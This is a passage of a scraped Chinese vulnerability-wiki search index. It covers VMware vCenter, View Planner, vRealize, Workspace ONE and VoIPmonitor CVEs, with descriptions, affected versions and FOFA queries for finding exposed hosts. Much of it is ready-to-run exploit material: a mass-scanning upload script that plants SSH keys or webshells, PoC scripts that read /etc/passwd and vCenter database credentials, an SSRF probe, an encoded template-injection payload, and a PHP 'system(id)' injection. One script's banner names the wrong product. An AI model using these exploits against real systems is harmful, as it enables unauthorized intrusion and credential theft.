","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:3:2","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"修复方案 升级VMware vCenter Server 至最新版本。 针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞，可按照 https://kb.vmware.com/s/article/85717 相关措施进行缓解。 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/:4:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2021-22005/"},{"categories":null,"content":"VMware vCenter Server 服务器端请求伪造漏洞 CVE-2021-21973 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/:0:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/"},{"categories":null,"content":"漏洞描述 VMware vCenter Server 插件中对用户提供的输入验证不当，未经过身份验证的远程攻击者可以发送特制的 HTTP 请求，欺骗应用程序向任意系统发起请求。 参考链接： https://kb.vmware.com/s/article/82374 https://twitter.com/osama_hroot/status/1365586206982082560 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/:1:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/"},{"categories":null,"content":"漏洞影响 vCenter Server: 6.5, 6.5 U1, 6.5 U3, 6.5.0, 6.5.0a, 6.5.0b, 6.5.0c, 6.5.0d, 6.5u2c, 6.7, 6.7 U3, 6.7.0, 6.7.0d, 6.7u3f, 7.0 Cloud Foundation: before 3.10.1.2, 4.2 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/:2:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/"},{"categories":null,"content":"漏洞复现 poc： GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1 HOST: vcIP: SSRF vcUsername:sa vaPassword:sa reqResource:sa ... ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/:3:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2021-21973/"},{"categories":null,"content":"VMware vCenter Server 远程代码执行漏洞 CVE-2021-21972 ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/:0:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/"},{"categories":null,"content":"漏洞描述 由于对 vSphere vCenter Server中用户提供的输入的验证不足，因此存在该漏洞。远程非身份验证攻击者可以向端口 443/tcp 发送专门制作的 HTTP 请求，并在系统上执行任意代码。 参考链接： https://blog.noah.360.net/vcenter-6-5-7-0-rce-lou-dong-fen-xi/ https://swarm.ptsecurity.com/unauth-rce-vmware/ https://www.vmware.com/security/advisories/VMSA-2021-0002.html ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/:1:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/"},{"categories":null,"content":"漏洞影响 VMware vCenter Server 7.0系列 \u003c 7.0.U1c VMware vCenter Server 6.7系列 \u003c 6.7.U3l VMware vCenter Server 6.5系列 \u003c 6.5 U3n ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/:2:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/"},{"categories":null,"content":"网络测绘 app=\"vmware-vCenter\" ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/:3:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/"},{"categories":null,"content":"漏洞复现 漏洞路径： https://target/ui/vropspluginui/rest/services/uploadova POST: name=\"uploadFile\"; filename=\"xxx.tar\" 构造POST包上传tar文件： Linux可以直接创建../../home/vsphere-ui/.ssh/authorized_keys TAR文件 后直接SSH连；Windows可以直接写入webshell。 批量检测脚本： https://raw.githubusercontent.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/main/CVE-2021-21972.py #-*- coding:utf-8 -*- banner = \"\"\" 888888ba dP 88 `8b 88 a88aaaa8P' .d8888b. d8888P .d8888b. dP dP 88 `8b. 88' `88 88 Y8ooooo. 88 88 88 .88 88. .88 88 88 88. .88 88888888P `88888P8 dP `88888P' `88888P' ooooooooooooooooooooooooooooooooooooooooooooooooooooo @time:2021/02/25 CVE-2021-21972.py C0de by NebulabdSec - @batsu \"\"\" print(banner) import threadpool import random import argparse import http.client import urllib3 import base64 import requests urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) http.client.HTTPConnection._http_vsn = 10 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0' TARGET_URI = \"/ui/vropspluginui/rest/services/uploadova\" def get_ua(): first_num = random.randint(55, 62) third_num = random.randint(0, 3200) fourth_num = random.randint(0, 140) os_type = [ '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)', '(X11; Linux x86_64)', '(Macintosh; Intel Mac OS X 10_12_6)' ] chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num) ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36', '(KHTML, like Gecko)', chrome_version, 'Safari/537.36'] ) return ua def CVE_2021_21972(url): # proxies = {\"scoks5\": \"http://127.0.0.1:1081\"} proxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\", } headers = { 'User-Agent': get_ua() } # data = base64.b64decode(Payload) # files = {'uploadFile': open('all.tar', 'rb')} #linux files = {'uploadFile': open('test.tar', 'rb')} #win targetUrl = url + TARGET_URI try: res = requests.post(url=targetUrl, headers=headers, files=files, verify=False, proxies=proxies) # proxies={'socks5': 'http://127.0.0.1:1081'}) if res.status_code == 200 and \"SUCCESS\" in res.text: print(\"[+] URL:{}--------存在CVE-2021-21872漏洞\".format(url)) # print(\"[+] Command success result: \" + res.text + \"\\n\") with open(\"存在漏洞地址.txt\", 'a') as fw: fw.write(url + '\\n') else: print(\"[-] \" + url + \" 没有发现CVE-2020-14882漏洞.\\n\") # except Exception as e: # print(e) except: print(\"[-] \" + url + \" Request ERROR.\\n\") def multithreading(filename, pools=5): works = [] with open(filename, \"r\") as f: for i in f: func_params = [i.rstrip(\"\\n\")] # func_params = [i] + [cmd] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(CVE_2021_21972, works) [pool.putRequest(req) for req in reqs] pool.wait() def main(): parser = argparse.ArgumentParser() parser.add_argument(\"-u\", \"--url\", help=\"Target URL; Example:http://ip:port\") parser.add_argument(\"-f\", \"--file\", help=\"Url File; Example:url.txt\") # parser.add_argument(\"-t\", # \"--tar\", # help=\"Create tar File; Example:test.tar\") # parser.add_argument(\"-c\", \"--cmd\", help=\"Commands to be executed; \") args = parser.parse_args() url = args.url # cmd = args.cmd file_path = args.file # jsp = args.tar # if jsp != None: # print(jsp) # generate_zip(jsp) if url != None and file_path ==None: CVE_2021_21972(url) elif url == None and file_path != None: multithreading(file_path, 10) # 默认15线程 if __name__ == \"__main__\": main() ","date":"0001-01-01","objectID":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/:4:0","tags":null,"title":"","uri":"/vmware-vcenter-server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21972/"},{"categories":null,"content":"VMware vCenter 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件、 ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 VMware vCenter Server 6.5.0a- f 版本 ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"ID_VC_Welcome\" ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 使用POC访问漏洞点 Windows主机 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties Linux主机 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: VMware vCenter任意文件读取漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware\\\\vCenterServer\\cfg\\\\vmware-vpx\\\\vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_linux = requests.get(url=vuln_url_linux, headers=headers, verify=False, timeout=5) response_windows = requests.get(url=vuln_url_windows, headers=headers, verify=False, timeout=5) if \"password\" in response_windows.text and response_windows.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 vcdb.properties \\033[0m\".format(target_url)) print(\"\\033[32m[o] Windows系统, 响应为:\\n{} \\033[0m\".format(response_windows.text)) elif \"root\" in response_linux.text and response_linux.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] Linux系统, 响应为:\\n{} \\033[0m\".format(response_linux.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/vmware-vcenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"VMware View Planner 未授权RCE CVE-2021-21978 ","date":"0001-01-01","objectID":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/:0:0","tags":null,"title":"","uri":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/"},{"categories":null,"content":"漏洞描述 输入验证不正确以及缺少授权会导致在logupload Web应用程序中上传任意文件。具有对View Planner Harness的网络访问权限未经授权的攻击者可以上传并执行特制文件，从而导致在logupload容器中远程执行代码。 参考链接： https://www.vmware.com/security/advisories/VMSA-2021-0003.html ","date":"0001-01-01","objectID":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/:1:0","tags":null,"title":"","uri":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/"},{"categories":null,"content":"漏洞复现 poc： POST /logupload?logMetaData={\"itrLogPath\":\"../../../../../../etc/httpd/html/wsgi_log_upload\",\"logFileType\":\"log_upload_wsgi.py\",\"workloadID\":\"2\"} Accept-Encoding:gzip,deflate Content-Type:multipart/form-data;boundary=---WebKitFormBoundaryH8GoragzRFVTw1VD ------WebKitFormBoundaryH8GoragzRFVTw1VD Content-Disposition:form-data;name=\"logfile\";filename=\"\" Content-Type:text/plain #! /usr/bin/env python3 import cgi import os,sys import logging import jsom .... ","date":"0001-01-01","objectID":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/:2:0","tags":null,"title":"","uri":"/vmware-view-planner-%E6%9C%AA%E6%8E%88%E6%9D%83rce-cve-2021-21978/"},{"categories":null,"content":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975 ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:0:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"漏洞描述 vRealize Operations Manager API包含服务器端请求伪造。可以通过网络访问vRealize Operations Manager API的恶意攻击者可以执行服务器端请求伪造攻击(SSRF)，以窃取管理凭据。 ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:1:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"漏洞影响 VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:2:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"网络测绘 title=\"vRealize Operations Manager\" ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:3:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"漏洞复现 访问登录页面如下 发送请求包如下 POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:4:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: VMware vRealize Operations Manager \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog \u003e\u003e\u003e xxx.dnslog.com \\033[0m') print('+------------------------------------------') def POC_1(target_url, v): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json;charset=UTF-8\" } data = '[\"{}\"]'.format(Dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10) if response.status_code == 200 : print(\"\\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, Dnslog) ","date":"0001-01-01","objectID":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/:5:0","tags":null,"title":"","uri":"/vmware-vrealize-operations-manager-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21975/"},{"categories":null,"content":"VMware Workspace ONE Access SSTI漏洞 CVE-2022-22954 ","date":"0001-01-01","objectID":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/:0:0","tags":null,"title":"","uri":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/"},{"categories":null,"content":"漏洞描述 VMware Workspace ONE Access（以前称为VMware Identity Manager）旨在通过多因素身份验证、条件访问和单点登录，让您的员工更快地访问SaaS、Web和本机移动应用程序。其中的CVE-2022-22954是一个匿名服务器模板注入漏洞，未经身份验证的攻击者可以利用此漏洞进行远程任意代码执行。 ","date":"0001-01-01","objectID":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/:1:0","tags":null,"title":"","uri":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/"},{"categories":null,"content":"漏洞影响 VMware Workspace ONE Access Appliance （版本号：20.10.0.0 ，20.10.0.1 ，21.08.0.0 ，21.08.0.1 ） VMware Identity Manager Appliance （版本号：3.3.3 ， 3.3.4 ， 3.3.5 ，3.3.6） VMware Realize Automation （版本号：7.6） ","date":"0001-01-01","objectID":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/:2:0","tags":null,"title":"","uri":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/"},{"categories":null,"content":"网络测绘 app=\"vmware-Workspace-ONE-Access\" ","date":"0001-01-01","objectID":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/:3:0","tags":null,"title":"","uri":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /catalog-portal/ui/oauth/verify?error=\u0026deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d ","date":"0001-01-01","objectID":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/:4:0","tags":null,"title":"","uri":"/vmware-workspace-one-access-ssti%E6%BC%8F%E6%B4%9E-cve-2022-22954/"},{"categories":null,"content":"VoIPmonitor 远程命令执行漏洞 CVE-2021-30461 ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:0:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"漏洞描述 VoIPmonitor是“具有在Linux上运行的SIP RTP和RTCP VoIP协议的具有商业前端的开源网络数据包嗅探器”。 使用通过Web界面到达的用户提供的数据，允许未经身份验证的远程用户触发VoIPmonitor中的远程PHP代码执行漏洞。 ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:1:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"漏洞影响 VoIPmonitor \u003c 24.60 ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:2:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"网络测绘 \"VoIPmonitor\" ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:3:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"漏洞复现 登录页面如下 index.php文件中的关键代码 $setConfigurationTypeValue_rslt = array(); if(file_exists('config/configuration.php')) { $existsConfiguration = true; if(isset($_POST['recheck'])) { if(!empty($_POST['SPOOLDIR'])) { setConfigurationTypeValue__index('SPOOLDIR', $_POST['SPOOLDIR']); } } 传入参数 recheck 和 SPOOLDIR， 并将SPOOLDIR 写入 config/configuration.php 中 发送如下请求包 POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 49 SPOOLDIR=test%22.system%28id%29.%22\u0026recheck=annen 成功执行命令 ","date":"0001-01-01","objectID":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/:4:0","tags":null,"title":"","uri":"/voipmonitor-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-30461/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php\" data = {\"SPOOLDIR\": \"/tmp\", \"recheck\": \"annen\"} headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) POC_2(target_url) def POC_2(target_url): vuln_url = target_url + \"/index.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = {\"SPOOLDIR\": \"test\\\".system(id).\\\"\", \"recheck\": \"annen\"} print(\"\\033[36m[o] 正在执行命令 id .....\\033[0m\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) if \"uid=\" in response.text: print(\"\\033[36m[o] 成功执行 id, 目标存在漏洞.....\\033[0m\") else: 